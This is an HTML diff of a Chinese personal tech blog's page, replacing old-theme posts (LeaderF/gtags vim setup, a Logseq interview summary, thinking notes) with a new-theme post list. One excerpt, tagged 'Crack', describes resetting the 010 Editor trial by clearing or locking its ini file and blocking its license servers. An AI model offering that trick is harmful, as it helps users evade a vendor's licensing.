[--append] [--match-path] [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [COMMON_OPTIONS]</span><br><span class="line">Leaderf[!] gtags -s &lt;PATTERN&gt; [-i] [--literal] [--path-style &lt;FORMAT&gt;] [-S &lt;DIR&gt;] [--append]</span><br><span class="line">                 [--match-path] [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [COMMON_OPTIONS]</span><br><span class="line">Leaderf[!] gtags -g &lt;PATTERN&gt; [-i] [--literal] [--path-style &lt;FORMAT&gt;] [-S &lt;DIR&gt;] [--append]</span><br><span class="line">                 [--match-path] [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [COMMON_OPTIONS]</span><br><span class="line">Leaderf[!] gtags --by-context [--auto-jump [&lt;TYPE&gt;]] [-i] [--literal] [--path-style &lt;FORMAT&gt;] [-S &lt;DIR&gt;]</span><br><span class="line">                 [--append] [--match-path] [--gtagsconf &lt;FILE&gt;] [--gtagslabel &lt;LABEL&gt;] [COMMON_OPTIONS]</span><br><span class="line">[COMMON_OPTIONS]: [--reverse] [--stayOpen] [--input &lt;INPUT&gt; | --cword]</span><br><span class="line">                  [--top | --bottom | --left | --right | --belowright | --aboveleft | --fullScreen]</span><br><span class="line">                  [--nameOnly | --fullPath | --fuzzy | --regexMode] [--nowrap] [--next | --previous]</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>LeaderF gtags 最常用的 <code>:Leaderf[!] gtags -d/-r/-s/-g</code>， 具体的作用如下所示，<code>!</code> 表示直接进入 normal 模式。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--gtagslibpath &lt;PATH&gt; [&lt;PATH&gt; ...]</span><br><span class="line">                      Specify the paths to search for library functions.</span><br><span class="line">-d &lt;PATTERN&gt;, --definition &lt;PATTERN&gt;</span><br><span class="line">                      Show locations of definitions.</span><br><span class="line">-r &lt;PATTERN&gt;, --reference &lt;PATTERN&gt;</span><br><span class="line">                      Show reference to a symbol which has definitions.</span><br><span class="line">-s &lt;PATTERN&gt;, --symbol &lt;PATTERN&gt;</span><br><span class="line">                      Show reference to a symbol which has no definition.</span><br><span class="line">-g &lt;PATTERN&gt;, --grep &lt;PATTERN&gt;</span><br></pre></td></tr></table></figure>
-
-<p>日常使用中，同样可以配置快捷键方便使用，下面的快捷键将对光标所在单词进行 tag 查找。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;leader&gt;fgd &lt;Plug&gt;LeaderfGtagsDefinition</span><br><span class="line">nmap &lt;leader&gt;fgr &lt;Plug&gt;LeaderfGtagsReference</span><br><span class="line">nmap &lt;leader&gt;fgs &lt;Plug&gt;LeaderfGtagsSymbol</span><br><span class="line">nmap &lt;leader&gt;fgg &lt;Plug&gt;LeaderfGtagsGrep</span><br></pre></td></tr></table></figure>
-
-<h3 id="运行-LeaderF-gtags-之后"><a href="#运行-LeaderF-gtags-之后" class="headerlink" title="运行 LeaderF gtags 之后"></a>运行 LeaderF gtags 之后</h3><p>使用 LeaderF + gtags 跳转到源码后，如果想继续跳转到下一个或者上一个 tag 可以使用 <code>Leaderf gtags --next</code> 和 <code>Leaderf gtags --previous</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">noremap &lt;leader&gt;fgn :&lt;C-U&gt;&lt;C-R&gt;=<span class="built_in">printf</span>(<span class="string">&quot;Leaderf gtags --next %s&quot;</span>, <span class="string">&quot;&quot;</span>)&lt;CR&gt;&lt;CR&gt;</span><br><span class="line">noremap &lt;leader&gt;fgp :&lt;C-U&gt;&lt;C-R&gt;=<span class="built_in">printf</span>(<span class="string">&quot;Leaderf gtags --previous %s&quot;</span>, <span class="string">&quot;&quot;</span>)&lt;CR&gt;&lt;CR&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="☆-LeaderF-的其他用法"><a href="#☆-LeaderF-的其他用法" class="headerlink" title="☆ LeaderF 的其他用法"></a>☆ LeaderF 的其他用法</h2><p>LeaderF 还可以和 <a target="_blank" rel="noopener" href="https://github.com/ludovicchabant/vim-gutentags">Gutentags</a> 配合使用进行源码浏览，但已经超出本文内容，有兴趣者可以查阅网络上的其他资料。</p>
-<h2 id="☆-参考资料"><a href="#☆-参考资料" class="headerlink" title="☆ 参考资料"></a>☆ 参考资料</h2><p><a target="_blank" rel="noopener" href="https://github.com/Yggdroot/LeaderF/blob/master/doc/leaderf.txt">https://github.com/Yggdroot/LeaderF/blob/master/doc/leaderf.txt</a><br><a target="_blank" rel="noopener" href="https://retzzz.github.io/dc9af5aa/">https://retzzz.github.io/dc9af5aa/</a><br><a target="_blank" rel="noopener" href="https://github.com/Yggdroot/LeaderF/blob/master/README.md">https://github.com/Yggdroot/LeaderF/blob/master/README.md</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/36279445">https://zhuanlan.zhihu.com/p/36279445</a><br><a target="_blank" rel="noopener" href="https://github.com/vim/vim/blob/master/runtime/doc/popup.txt">https://github.com/vim/vim/blob/master/runtime/doc/popup.txt</a><br><a target="_blank" rel="noopener" href="https://neovim.io/doc/user/api.html#api-floatwin">https://neovim.io/doc/user/api.html#api-floatwin</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/logseq_interview/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/logseq_interview/" class="post-title-link" itemprop="url">对话logseq联合创始人，看硅谷大佬的传奇投资 总结</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-06-20 00:00:00" itemprop="dateCreated datePublished" datetime="2023-06-20T00:00:00+08:00">2023-06-20</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><a target="_blank" rel="noopener" href="https://pca.st/x398eeq0">https://pca.st/x398eeq0</a></p>
-<ol>
-<li>技术招聘时，有 side project 的优先，认为有 side project 的技术人员大多有自己独特的想法，自驱力也较强。</li>
-<li>强调技术热情和学习能力，小众语言会的人不多，但是语言不是主要问题。对于对新技术充满热情和好奇心的技术人来说学习就可以了。</li>
-<li>自由开放的团队文化，大都是技术人员，相互之间比较平等，和社区沟通交流紧密。没有明确的 deadline，但大家都比较努力，工作任务分配以兴趣自领为主指派为辅。</li>
-<li>没有太多的营销，产品定位和路线也是逐渐明确，最开始是从秦天生的一个 side project 慢慢发展起来。也没有定量分析过产品用户爆炸性增长的原因，只有模糊的感觉，Logseq 内置 PDF 阅读和标注感觉是一个突破点。</li>
-<li>Logseq 团队关于远程工作的一些实践，志远认为在一个国际团队中远程工作需要克服时差问题，需要讨论问题的时候比较麻烦。解决的方式是写比较详细的 issue 复现文档，基本是 step by step 的。讨论想法多录制一些演示视频，有问题就直接给对方发消息不能马上回复也问题不大，很多事情没有想象中的重要。</li>
-<li>Logseq 团队协作的主要工具，代码问题和 issue 管理使用 Github，问题讨论使用 Discord + 论坛 （Discord 处理即时反馈，论坛主要用来较长时间的讨论）， 团队内部的通讯工具使用 Slack。</li>
-</ol>
-<p>Logseq 的投资人非常豪华,我查了一下有 Stripe 首席执行官 Patrick Collison、GitHub 前首席执行官 Nat Friedman、Shopify 创始人 Tobias Lütke、A16Z 总经理 Sriram Krishnan等人，更神奇的是他们大多也是 Logseq 的用户。</p>
-<p>听完这期博客，我感觉陈志远是非常纯粹的技术人员，谦逊内敛，对技术充满热爱，喜欢用技术解决现实生活中的问题。坚持自己的产品定位，不浮躁不傲娇，长期认真地完善产品功能，不为短期的生存而感到焦虑，这或许就是小而美的团队的优势吧。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/zhengweizhongyao/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/cn/zhengweizhongyao/" class="post-title-link" itemprop="url">训练思维，判断观点</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2023-06-19 00:00:00" itemprop="dateCreated datePublished" datetime="2023-06-19T00:00:00+08:00">2023-06-19</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <ol>
-<li><p>避免过度解读</p>
-<ul>
-<li>好的思维方式大体符合《孙子兵法》中「以正合，以奇胜」，这里的奇是机动兵力的意思。我们在了解事情的时候，首先要理解主流观点，这样我们做事才有坚实的起点，一上来就看非主流观点，很可能就丢掉了根本而陷入旁支细节去了。</li>
-</ul>
-</li>
-<li><p>证伪比证实更重要</p>
-<ul>
-<li>人类对世界的认知都是片面的，只是不断地接近真理。很多你认为可以自洽，可以理解的原因，可能不是真正的原因，并不是因果关系，甚至可能都不是相关关系。</li>
-<li>把错误的原因当成真正的原因，要倒大霉。一定要小心无法证伪的推论，一个事情成功的因素可以有很多，都可以解释的通。</li>
-<li>常识之所以重要是因为经过了长时间的证实和证伪是可靠的结论，遵循常识就可以避开很多的错误和陷阱</li>
-</ul>
-</li>
-<li><p>判定利益冲突</p>
-<ul>
-<li>当发表意见的人和所讨论的主题利益相关，那么其结可能就会有明显的偏向性。</li>
-<li>使用逻辑过滤信息和结论</li>
-<li>得出问题结论的推理过程需要符合逻辑，不能依靠想象。</li>
-</ul>
-</li>
-<li><p>利用成本思维进行判断</p>
-<ul>
-<li>做任何事情都有成本，当接受的信息太多的时候，可以用成本因素进行过滤，通过成本来思考人们做事的初衷和理由是有效的。</li>
-</ul>
-</li>
-</ol>
-<p>#硅谷来信 #吴军</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/7/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-  <div class="copyright">
-    &copy; 
-    <span itemprop="copyrightYear">2023</span>
-    <span class="with-love">
-      <i class="fa fa-heart"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">henices</span>
-  </div>
-
-    </div>
-  </footer>
-
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-  <div class="sidebar-dimmer"></div>
-  <div class="back-to-top" role="button" aria-label="Back to top">
-    <i class="fa fa-arrow-up fa-lg"></i>
-    <span>0%</span>
-  </div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
-
-  
-
-
-
-
-
-
-  
-
-
-
-
-
-</body>
-</html>
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">102</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><span> RSS</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://wallpaperaccess.com/full/1146672.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="安全代码"><span class="site-name">安全代码</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><span> RSS</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">安全代码</h1><div id="site_social_icons"><a class="social-icon" href="https://twitter.com/henices" target="_blank" title="Twitter"><i class="fab fa-twitter" style="color: #4a7dbe;"></i></a><a class="social-icon" href="mailto:henices@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #24292e;"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/Android_binder_fuzzing/" title="Android Binder Fuzzing 的一些思路">Android Binder Fuzzing 的一些思路</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.188Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Security/">Security</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Android/">Android</a></span></div><div class="content">1. binder 简介Android安全模型的一个关键部分是每一个应用程序都被赋予一个唯一的 Linux 用户 ID 和组 ID，运行在自己的进程和 Dalvik 虚拟机里。在应用程序安装的过程中，Android系统设备上创建一个专门的目录（文件夹），用于存储此应用程序的数据，并且仅允许应用程序利用Linux 用户 ID 和组 ID 的相应访问权限对这些数据进行访问。此外，此应用程序的 Dalvik 虚拟机使用应用程序的用户 ID 运行在自己的进程中。这些关键的机制在操作系统层面上强制数据安全，因为应用程序之间不共享内存、访问权限及磁盘存储。应用程序只能在它们自己的 Dalvik 虚拟机范围内访问内存和数据。
+1234567891011121314151617$ ps...u0_a16        2757   882 2574956 116944 SyS_epoll+          0 S com.google.android.gms.persistentu0_a128       2774   883 1939084  87720 SyS_epoll+          0 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/afl/" title="afl-fuzz 框架">afl-fuzz 框架</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.175Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Security/">Security</a></span></div><div class="content">afl-fuzz 的整体架构，新手理解起来还是比较费劲，网络上发现一张图觉得不错，放上来大家看看，感谢原作者。
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/afl-fuzz1/" title="Dissecting American Fuzzy Lop A FuzzBench Evaluation 要点">Dissecting American Fuzzy Lop A FuzzBench Evaluation 要点</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.151Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Security/">Security</a></span></div><div class="content">paper: https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf
+两个实验的结论 (主要基于 FuzzBench)
+Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance of each variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggests that users sho ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/a_change/" title="关于A股变盘的假期效应思考">关于A股变盘的假期效应思考</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.150Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/investment/">investment</a></span></div><div class="content">沉浮 A股多年，发现一个比较重要的规律，A 股变盘的时间节点大多发生在重大节假日期间，分别举例如下：
+
+「1」重大节日 （包括阳历和农历： 劳动节，国庆节，中秋节，端午节，过年 等）
+「2」周一&#x2F;周五
+「3」月初&#x2F;月末
+
+有人总结出 A 股变盘时间节点和农历的 24 节气相关，每个节气的时间间隔大致在 15 到 16 天左右，这条规律其实和上面的 「1」 说法是一致的。
+思考其背后的原因，平时交易日都是连续的中间无间断，大家的交易思路和看法也比较容易连续一致。每逢重大节日，或者月初月末，往往都是放假休息的时间，外加期间各种信息的输入量比平时大很多，这样容易有思维波动。重大节日后，主力一带节奏，容易对大家的思维进行强化，分歧转一致后，就真的变盘了。
+A股还有个月初，月末效应，月初赚钱，月末亏钱，比较奇怪，可能和基金经理的月初建仓和月末考核相关，这条规律几乎是对称的，如果月末没有大跌，月初基本就没有大赚效应。
+后面发现居然有一个股票技术分析流派叫季节派。（季节理论 Season Theory）
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/304/" title="紫竹桥附近看病情况">紫竹桥附近看病情况</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.135Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Life/">Life</a></span></div><div class="content">作为一个长期在帝都紫竹桥混吃的中年大叔，经常遇到需要看病的情况，主要需求有两个 （大人看病，小孩看病）。
+总结附近医院情况，个人理解，供参考：
+466:
+缺点：没有儿科，巨贵，感觉医生喜欢过度治疗，据说一些科室已被私人承包，媳妇和自己都被坑过。优点：离紫竹桥距离近，三甲，人通常比较少，小病，偷懒的时候可以过去。据说牙科不错，但是我没有去过。
+304:
+缺点：信息化程度相对较弱，但是看病流程梳理得不错。优点：三甲，有儿科，对小儿看病有一定优待。医生水平不错，小孩在这看过几次，治疗效果不错。
+现在304 改名为 解放军总医院第四医学中心，儿科的实力比以往有较大提升。
+四季青：
+缺点：二级医院，儿科有的医生感觉不太专业。优点：挂号方便，有儿科，医院较大。
+北方医院：
+缺点：二级医院， 医院较小。优点：离紫竹桥距离近，有保健科，小孩打预防针不错。
+空总：
+在这个医院多个科室看过病，家人还在这做过微创手术。
+缺点：挂号有点难，人多，儿科水平一般。优点：三甲，皮肤科北京有名，各科室水平比较均衡。信息化程度高，看病挺方便。
+海总：
+这个医院我没有去过，距离稍远。
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/010editor/" title="010editor 保持试用">010editor 保持试用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-09-06T03:00:51.111Z" title="Created 2023-09-06 11:00:51">2023-09-06</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/linux/">linux</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Crack/">Crack</a></span></div><div class="content">软件介绍010Editor是一款快速且强大的十六进制编辑器。用来编辑二进制文件。有一个友好易于使用的界面，无限次的undo和redo操作。另外还可以打印十六进制的字节或者以书签的方式标出某些重要的字节。支持二进制模板（binary template）系统。
+保持试用国外软件很多时候相当厚道了，试用基本是全功能，轻微延时和不能自动更新二进制模板，就日常使用来说基本是完全够用了。
+关键文件为 ~/.config/SweetScape/010 Editor.ini，无法使用的时侯可以把这个文件清空，将恢复30天试用状态，或者简单粗暴的将文件设置为只读。
+1chmod 444 &quot;010 Editor.ini&quot;
+
+用IDA逆向的时侯没有发现这个文件比较奇怪。这个文件是 是使用strace命令发现的，strace命令支持 -e 的过滤参数将有效减少输出，一般来说看strace日志文件可以从最后往前看。
+1strace -e trace=file ./010editor
+
+从代码上看有使用网络验证需要在hosts文件中屏敝两个网站， 可以减少一些不必要的麻烦。
+12127.0.0 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/PARA/" title="(译文) 一秒钟内整理数字生活的系统 by claude">(译文) 一秒钟内整理数字生活的系统 by claude</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-08-03T16:00:00.000Z" title="Created 2023-08-04 00:00:00">2023-08-04</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PKM/">PKM</a></span></div><div class="content">The PARA Method: The Simple System for Organizing Your Digital Life in Secondshttps://fortelabs.com/blog/para
+想象一下完美的组织系统。一个系统会告诉你如何确切地把生活中的每一件信息-每份文件、笔记、日程、大纲和研究的碎片-放在哪里,以及之后如何轻松地找到它们。
+这样的系统需要非常简单易用,也非常容易维护。毕竟,只有最简单、最轻松的习惯能长期坚持。
+它需要灵活适应你在不同人生阶段的需求,同时也需要全面,这样你可以在存储信息的各个地方使用它,比如你的电脑文件系统、云存储平台(如Dropbox或谷歌云端硬盘)或者数字笔记应用。
+但是最重要的是,理想的组织系统能够直接带来工作和生活中的实实在在的好处。它会极大地加速你完成最重要的项目和实现目标。
+换句话说, 组织你的生活的最佳系统,是可操作的。
+它不会给你制造更多障碍,不会推迟那些能带来进步的行动,而是让这些行动更接近和更容易开始与完成。
+通过十多年的个人实践、指导数千学生以及辅导世界级专业人士,我已经制定出这样的系统。
+它被称为PAR ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/vim_gtags_leaderf/" title="在 vim 中使用 LeaderF 和 gtags">在 vim 中使用 LeaderF 和 gtags</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-07-19T16:00:00.000Z" title="Created 2023-07-20 00:00:00">2023-07-20</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Programming/">Programming</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/vim/">vim</a></span></div><div class="content">☆ 缘由和一些 vim 历史前些年 vim 没有子窗口的概念，日本的一个 vim 插件作者为了解决这个问题生撸了一套流程，当时 unite.vim 横空出世惊艳了我一把。后面随着技术发展，neovim 和 vim 先后引入了 floating window ，这才使得情况变得好了一点。
+https://github.com/vim/vim/blob/master/runtime/doc/popup.txthttps://neovim.io/doc/user/api.html#api-floatwin
+得益于新技术，在 vim 中使用 LeaderF 插件的交互体验上了一个台阶。
+
+neovim 从 0.9 版本开始放弃对 cscope 的支持 https://twitter.com/Neovim/status/1580933880579641344
+这给我阅读源码造成了一些问题，虽然 vim 仍然可以使用 cscope，但 vim 的启动速度不如 nvim 快，所以我开始寻找替代方案。同时，我发现 denite.nvim，unite.vim，作者也不怎么维护了，一想似乎是很多年没有维护 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/logseq_interview/" title="对话logseq联合创始人，看硅谷大佬的传奇投资 总结">对话logseq联合创始人，看硅谷大佬的传奇投资 总结</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-06-19T16:00:00.000Z" title="Created 2023-06-20 00:00:00">2023-06-20</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Programming/">Programming</a></span></div><div class="content">https://pca.st/x398eeq0
+
+技术招聘时，有 side project 的优先，认为有 side project 的技术人员大多有自己独特的想法，自驱力也较强。
+强调技术热情和学习能力，小众语言会的人不多，但是语言不是主要问题。对于对新技术充满热情和好奇心的技术人来说学习就可以了。
+自由开放的团队文化，大都是技术人员，相互之间比较平等，和社区沟通交流紧密。没有明确的 deadline，但大家都比较努力，工作任务分配以兴趣自领为主指派为辅。
+没有太多的营销，产品定位和路线也是逐渐明确，最开始是从秦天生的一个 side project 慢慢发展起来。也没有定量分析过产品用户爆炸性增长的原因，只有模糊的感觉，Logseq 内置 PDF 阅读和标注感觉是一个突破点。
+Logseq 团队关于远程工作的一些实践，志远认为在一个国际团队中远程工作需要克服时差问题，需要讨论问题的时候比较麻烦。解决的方式是写比较详细的 issue 复现文档，基本是 step by step 的。讨论想法多录制一些演示视频，有问题就直接给对方发消息不能马上回复也问题不大，很多事情没有想象中的重要。
+L ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/cn/zhengweizhongyao/" title="训练思维，判断观点">训练思维，判断观点</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">Created</span><time datetime="2023-06-18T16:00:00.000Z" title="Created 2023-06-19 00:00:00">2023-06-19</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/KNOWLEDGE/">KNOWLEDGE</a></span></div><div class="content">
+避免过度解读
+
+好的思维方式大体符合《孙子兵法》中「以正合，以奇胜」，这里的奇是机动兵力的意思。我们在了解事情的时候，首先要理解主流观点，这样我们做事才有坚实的起点，一上来就看非主流观点，很可能就丢掉了根本而陷入旁支细节去了。
+
+
+证伪比证实更重要
+
+人类对世界的认知都是片面的，只是不断地接近真理。很多你认为可以自洽，可以理解的原因，可能不是真正的原因，并不是因果关系，甚至可能都不是相关关系。
